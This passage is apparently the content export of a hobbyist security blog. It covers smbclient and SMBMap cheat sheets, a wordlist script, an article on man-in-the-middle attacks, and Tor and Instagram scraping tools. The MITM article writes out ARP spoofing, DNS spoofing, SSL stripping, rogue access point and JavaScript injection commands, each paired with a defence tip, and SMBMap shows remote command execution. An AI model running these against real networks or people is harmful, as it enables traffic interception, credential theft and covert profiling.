\u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. 